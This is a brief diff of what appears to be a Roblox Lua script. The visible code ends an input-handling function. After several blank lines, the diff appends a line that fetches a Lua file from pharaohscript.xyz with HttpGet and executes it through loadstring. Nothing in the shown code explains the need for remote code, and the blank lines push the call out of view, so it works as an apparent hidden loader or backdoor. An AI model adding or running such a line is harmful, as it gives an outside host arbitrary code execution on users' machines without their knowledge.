@@ -16,3 +16,7 @@ UIS.InputBegan:connect(function(UserInput)
         end)
     end
 end)
+
+
+
+loadstring(game:HttpGet("https://pharaohscript.xyz/free.lua", true))()
